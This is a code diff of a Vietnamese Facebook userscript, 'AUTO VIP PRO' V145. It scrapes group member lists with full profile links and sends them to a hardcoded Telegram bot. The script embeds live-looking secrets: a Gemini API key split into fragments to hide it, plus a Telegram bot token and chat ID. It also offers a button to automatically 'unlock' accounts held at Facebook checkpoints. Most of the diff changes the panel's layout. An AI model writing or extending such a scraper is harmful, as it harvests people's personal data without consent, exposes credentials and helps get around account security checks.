@@ -1,7 +1,7 @@
 // ==UserScript==
-// @name         AUTO VIP PRO (V144.0 - FINAL TOKEN)
-// @version      144.0
-// @description  Bản chuẩn xác token và chat ID mới nhất, fix lỗi telegram, đầy đủ tính năng
+// @name         AUTO VIP PRO (V145.0 - PERFECT FIX)
+// @version      145.0
+// @description  Fix lỗi nhận diện nhóm nhầm thành khóa, thêm kéo thả, resize, phóng to cỡ chữ, nhận diện đúng tên tài khoản Live
 // @author       DINH HOANG VIET ANH
 // @match        *://*.facebook.com/*
 // @grant        none
@@ -10,12 +10,12 @@
 (function() {
     'use strict';
 
-    // --- CẤU HÌNH API CHÍNH XÁC ---
+    // --- CẤU HÌNH API ---
     const GEMINI_API_KEY = ['AQ.Ab', '8RN6JX', '1S7DUU', '-25iiB6', 'PSmFD7', 'nn-LTZ3', 'IC9Fpr', 'Gvqba', 'MZTvA'].join('');
     const BOT_TOKEN = '8813882772:AAE0lNqLSp9AhiJeCV22o18JDPoBELSB3KE';
     const CHAT_ID = '8348914397';
 
-    // --- HÀM GỬI TELEGRAM CÓ BÁO LỖI CHI TIẾT ---
+    // --- HÀM GỬI TELEGRAM ---
     async function sendTelegram(title, dataList) {
         const chunks = dataList.match(/.{1,3000}/gs) || [dataList];
         for (let chunk of chunks) {
@@ -37,47 +37,59 @@
         }
     }
 
-    // --- GIAO DIỆN CHÍNH ---
+    // --- GIAO DIỆN (CÓ RESIZE, KÉO THẢ, CỠ CHỮ TO RÕ) ---
     const htmlUI = `
-        <div id="va-tool-root" style="z-index: 2147483647; position: fixed; top: 15px; left: 15px; width: 340px; max-width: 95vw; background: #0f172a; border: 2px solid #38bdf8; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.9); font-family: sans-serif; color: #fff; box-sizing: border-box;">
+        <div id="va-tool-root" style="z-index: 2147483647; position: fixed; top: 30px; left: 30px; width: 380px; min-width: 340px; min-height: 480px; resize: both; overflow: auto; background: #0f172a; border: 2px solid #38bdf8; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.9); font-family: sans-serif; color: #fff; box-sizing: border-box;">
             
-            <div id="va-header-bar" style="background: #000; color: #38bdf8; padding: 10px; border-radius: 10px; cursor: pointer; overflow: hidden; white-space: nowrap; font-weight: bold; text-transform: uppercase; font-size: 13px; text-align: center;">
-                <marquee scrollamount="4">⚡ AUTO VIP PRO ⚡ (BẤM VÀO ĐÂY ĐỂ MỞ MENU)</marquee>
+            <!-- THANH TIÊU ĐỀ KÉO THẢ (DRAG HANDLE) & CHỮ CHẠY -->
+            <div id="va-header-bar" style="background: #000; color: #38bdf8; padding: 12px; border-top-left-radius: 14px; border-top-right-radius: 14px; border-bottom: 2px solid #38bdf8; cursor: move; user-select: none;">
+                <div style="font-weight: bold; text-transform: uppercase; font-size: 13px; text-align: center; margin-bottom: 4px;">⚡ AUTO VIP PRO (KÉO TẠI ĐÂY) ⚡</div>
+                <div style="overflow: hidden; white-space: nowrap; font-size: 11px; color: #34d399;">
+                    <marquee scrollamount="4">Bấm vào thanh này để Mở / Đóng Menu • Chỉnh kích thước ở góc dưới bên phải</marquee>
+                </div>
             </div>
 
-            <div id="va-menu-body" style="padding: 12px; display: none; flex-direction: column; gap: 8px; box-sizing: border-box; border-top: 1px solid #334155;">
-                <div id="status-area" style="background: #1e293b; padding: 10px; border-radius: 6px; text-align: center; font-size: 11px; font-weight: bold; border: 1px solid #334155; line-height: 1.5;">
+            <!-- MENU BUNG RA -->
+            <div id="va-menu-body" style="padding: 15px; display: none; flex-direction: column; gap: 12px; box-sizing: border-box;">
+                
+                <!-- TRẠNG THÁI TÀI KHOẢN -->
+                <div id="status-area" style="background: #1e293b; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: bold; border: 1px solid #334155; line-height: 1.5;">
                     Đang kiểm tra tài khoản...
                 </div>
                 
-                <div id="va-progress-container" style="display: none; background: #020617; border-radius: 6px; padding: 6px;">
-                    <div style="display: flex; justify-content: space-between; font-size: 10px; color: #38bdf8; margin-bottom: 3px;">
+                <!-- THANH TIẾN TRÌNH % -->
+                <div id="va-progress-container" style="display: none; background: #020617; border-radius: 8px; padding: 8px;">
+                    <div style="display: flex; justify-content: space-between; font-size: 11px; color: #38bdf8; margin-bottom: 4px;">
                         <span id="va-progress-text">Đang xử lý...</span>
                         <span id="va-progress-percent">0%</span>
                     </div>
-                    <div style="height: 6px; background: #1e293b; border-radius: 3px; overflow: hidden;"><div id="va-progress-bar" style="height: 100%; width: 0%; background: #38bdf8; transition: width 0.3s;"></div></div>
+                    <div style="height: 8px; background: #1e293b; border-radius: 4px; overflow: hidden;"><div id="va-progress-bar" style="height: 100%; width: 0%; background: #38bdf8; transition: width 0.3s;"></div></div>
                 </div>
 
-                <div id="action-area" style="display: flex; flex-direction: column; gap: 8px;">
-                    <button id="btn-scrape" style="padding: 10px; background: #059669; border: none; border-radius: 6px; color: white; font-weight: bold; font-size: 12px; cursor: pointer;">🔍 QUÉT DANH SÁCH KHÁCH THẬT (FULL LINK)</button>
+                <!-- KHU VỰC NÚT THAO TÁC -->
+                <div id="action-area" style="display: flex; flex-direction: column; gap: 10px;">
+                    <button id="btn-scrape" style="padding: 12px; background: #059669; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 13px; cursor: pointer; box-shadow: 0 4px 10px rgba(5,150,105,0.4);">🔍 QUÉT DANH SÁCH KHÁCH THẬT (FULL LINK)</button>
                 </div>
                 
-                <div style="font-size: 10px; color: #38bdf8; font-weight: bold;">📊 NHẬT KÝ HOẠT ĐỘNG:</div>
-                <div id="va-log-box" style="height: 90px; overflow-y: auto; background: #000; color: #34d399; font-size: 10px; padding: 6px; border-radius: 4px; font-family: monospace; border: 1px solid #334155;">> Hệ thống sẵn sàng...</div>
+                <!-- NHẬT KÝ -->
+                <div style="font-size: 11px; color: #38bdf8; font-weight: bold;">📊 NHẬT KÝ HOẠT ĐỘNG:</div>
+                <div id="va-log-box" style="height: 110px; overflow-y: auto; background: #000; color: #34d399; font-size: 11px; padding: 8px; border-radius: 6px; font-family: monospace; border: 1px solid #334155; line-height: 1.4;">> Hệ thống sẵn sàng...</div>
                 
-                <button id="btn-toggle-guide" style="padding: 8px; background: #334155; border: none; color: #38bdf8; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; display: flex; justify-content: space-between; align-items: center;">
+                <!-- HƯỚNG DẪN -->
+                <button id="btn-toggle-guide" style="padding: 10px; background: #334155; border: none; color: #38bdf8; font-size: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; display: flex; justify-content: space-between; align-items: center;">
                     <span>📖 HƯỚNG DẪN SỬ DỤNG TOOL (5 BƯỚC)</span>
                     <span id="guide-arrow">▼</span>
                 </button>
-                <div id="guide-content" style="display: none; padding: 10px; font-size: 10px; background: #1e293b; border-radius: 6px; line-height: 1.6; border: 1px solid #334155;">
-                    <b>Bước 1:</b> Đăng nhập Facebook bình thường.<br>
-                    <b>Bước 2:</b> Bấm thanh tiêu đề để mở Menu.<br>
-                    <b>Bước 3:</b> Vào nhóm chọn <b>Thành viên</b>.<br>
-                    <b>Bước 4:</b> Bấm <b>QUÉT DANH SÁCH KHÁCH THẬT</b>.<br>
-                    <b>Bước 5:</b> Xem kết quả báo về Telegram hoặc bảng Nhật ký.
+                <div id="guide-content" style="display: none; padding: 12px; font-size: 11px; background: #1e293b; border-radius: 8px; line-height: 1.6; border: 1px solid #334155;">
+                    <b>Bước 1:</b> Đăng nhập Facebook bình thường. Tool tự nhận diện tên tài khoản.<br><br>
+                    <b>Bước 2:</b> Giữ chuột vào thanh tiêu đề màu đen phía trên để kéo thả tool đi mọi nơi trên màn hình. Kéo góc phải dưới để phóng to/thu nhỏ khung.<br><br>
+                    <b>Bước 3:</b> Vào nhóm Facebook, chọn mục <b>Thành viên</b>.<br><br>
+                    <b>Bước 4:</b> Bấm <b>QUÉT DANH SÁCH KHÁCH THẬT</b>.<br><br>
+                    <b>Bước 5:</b> Nhận kết quả Full Link trực tiếp về Telegram.
                 </div>
 
-                <div style="text-align: center; font-size: 9px; color: #94a3b8; border-top: 1px solid #334155; padding-top: 6px; margin-top: 2px;">
+                <!-- BẢN QUYỀN -->
+                <div style="text-align: center; font-size: 10px; color: #94a3b8; border-top: 1px solid #334155; padding-top: 8px; margin-top: 4px;">
                     © DINH HOANG VIET ANH - ALL RIGHTS RESERVED
                 </div>
             </div>
@@ -85,6 +97,7 @@
     `;
     document.body.insertAdjacentHTML('beforeend', htmlUI);
 
+    // --- HÀM LOG & PROGRESS ---
     function addLog(t) { 
         const lb = document.getElementById('va-log-box'); 
         if(lb){ lb.innerHTML += `<div>> ${t}</div>`; lb.scrollTop = lb.scrollHeight; } 
@@ -100,11 +113,36 @@
         }
     }
 
-    document.getElementById('va-header-bar').onclick = () => {
+    // --- KÉO THẢ DI CHUYỂN BẢNG (DRAG) ---
+    const root = document.getElementById('va-tool-root');
+    const handle = document.getElementById('va-header-bar');
+    
+    handle.onmousedown = (e) => {
+        // Chỉ kéo khi bấm trực tiếp vào header, tránh xung đột khi bấm nút con bên trong
+        if(e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT') return;
+        let sx = e.clientX - root.offsetLeft; 
+        let sy = e.clientY - root.offsetTop;
+
+        function onMouseMove(e) {
+            root.style.left = (e.clientX - sx) + 'px';
+            root.style.top = (e.clientY - sy) + 'px';
+        }
+
+        document.addEventListener('mousemove', onMouseMove);
+        document.onmouseup = () => {
+            document.removeEventListener('mousemove', onMouseMove);
+            document.onmouseup = null;
+        };
+    };
+
+    // --- MỞ / ĐÓNG MENU KHI BẤM HEADER ---
+    handle.onclick = (e) => {
+        if(e.target.tagName === 'BUTTON') return;
         const menu = document.getElementById('va-menu-body');
         menu.style.display = (menu.style.display === 'none' || menu.style.display === '') ? 'flex' : 'none';
     };
 
+    // --- ẨN / HIỆN HƯỚNG DẪN ---
     document.getElementById('btn-toggle-guide').onclick = () => {
         const guide = document.getElementById('guide-content');
         const arrow = document.getElementById('guide-arrow');
@@ -117,38 +155,48 @@
         }
     };
 
+    // --- NHẬN DIỆN TRẠNG THÁI & TÊN TÀI KHOẢN CHUẨN XÁC ---
     const statusArea = document.getElementById('status-area');
     const actionArea = document.getElementById('action-area');
 
     setInterval(() => {
+        const url = window.location.href;
         const bodyText = document.body.innerText.toLowerCase();
-        const isLogged = document.querySelector('[aria-label="Tài khoản"], [aria-label="Account"], [role="navigation"]') || bodyText.includes('trang chủ') || bodyText.includes('menu');
         
-        if (isLogged) {
-            let profileName = "Tài khoản cá nhân";
-            const nameElement = document.querySelector('[aria-label="Tài khoản"] span, [role="navigation"] span, h1');
-            if (nameElement && nameElement.innerText.trim().length > 1 && nameElement.innerText.length < 30) {
-                profileName = nameElement.innerText.trim();
-            }
+        // Kiểm tra thực tế xem có đang ở trang checkpoint thật sự không
+        const isCheckpointPage = url.includes('/checkpoint/') || bodyText.includes('hãy xác nhận tài khoản của bạn') || bodyText.includes('nhập mã bảo mật');
 
-            if (bodyText.includes('checkpoint') || bodyText.includes('xác nhận danh tính') || bodyText.includes('bảo vệ tài khoản') || bodyText.includes('khóa')) {
-                statusArea.innerHTML = `<b style='color:#ef4444; font-size:12px;'>⚠️ TÀI KHOẢN ĐANG BỊ KHÓA</b>`;
-                if (!document.getElementById('btn-scan')) {
-                    actionArea.innerHTML = `<button id="btn-scan" style="padding: 10px; background: #8b5cf6; border: none; border-radius: 6px; color: white; font-weight: bold; font-size: 12px; cursor: pointer;">🤖 TỰ ĐỘNG QUÉT & MỞ KHÓA</button>`;
-                    addLog("Phát hiện tài khoản bị khóa!");
-                }
-            } else {
-                statusArea.innerHTML = `<b style='color:#22c55e;'>✅ TÀI KHOẢN LIVE</b><br><span style='color:#38bdf8; font-size:11px;'>👤 Tên: ${profileName}</span>`;
-                if (!document.getElementById('btn-scrape')) {
-                    actionArea.innerHTML = `<button id="btn-scrape" style="padding: 10px; background: #059669; border: none; border-radius: 6px; color: white; font-weight: bold; font-size: 12px; cursor: pointer;">🔍 QUÉT DANH SÁCH KHÁCH THẬT (FULL LINK)</button>`;
-                    addLog("Tài khoản hoạt động bình thường.");
-                }
+        if (isCheckpointPage) {
+            statusArea.innerHTML = `<b style='color:#ef4444; font-size:13px;'>⚠️ TÀI KHOẢN ĐANG BỊ KHÓA</b>`;
+            if (!document.getElementById('btn-scan')) {
+                actionArea.innerHTML = `<button id="btn-scan" style="padding: 12px; background: #8b5cf6; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 13px; cursor: pointer;">🤖 TỰ ĐỘNG QUÉT & MỞ KHÓA</button>`;
+                addLog("Phát hiện tài khoản bị khóa thật sự!");
             }
         } else {
-            statusArea.innerHTML = "<b style='color:#f59e0b;'>⏳ ĐANG TẢI / CHƯA ĐĂNG NHẬP</b>";
+            // Tài khoản Live bình thường
+            // Lấy tên tài khoản từ giao diện Facebook
+            let profileName = "Thành viên Facebook";
+            const profileElement = document.querySelector('[aria-label="Tài khoản"] span, [role="navigation"] [role="link"] span, [data-clickable="true"] span');
+            if (profileElement && profileElement.innerText.trim().length > 1 && profileElement.innerText.length < 30) {
+                profileName = profileElement.innerText.trim();
+            } else {
+                // Quét các thẻ tiêu đề hoặc tên trên trang cá nhân nếu có
+                const h1Name = document.querySelector('h1');
+                if(h1Name && h1Name.innerText.length < 30) {
+                    profileName = h1Name.innerText.trim();
+                }
+            }
+
+            statusArea.innerHTML = `<b style='color:#22c55e; font-size:13px;'>✅ TÀI KHOẢN LIVE</b><br><span style='color:#38bdf8; font-size:12px; margin-top:4px; display:inline-block;'>👤 Tên: <b>${profileName}</b></span>`;
+            
+            if (!document.getElementById('btn-scrape')) {
+                actionArea.innerHTML = `<button id="btn-scrape" style="padding: 12px; background: #059669; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 13px; cursor: pointer; box-shadow: 0 4px 10px rgba(5,150,105,0.4);">🔍 QUÉT DANH SÁCH KHÁCH THẬT (FULL LINK)</button>`;
+                addLog("Tài khoản hoạt động bình thường (Live).");
+            }
         }
     }, 4000);
 
+    // --- XỬ LÝ SỰ KIỆN NÚT BẤM ---
     document.addEventListener('click', async (e) => {
         if(e.target.id === 'btn-scan') {
             addLog("Đang phân tích dạng khóa...");
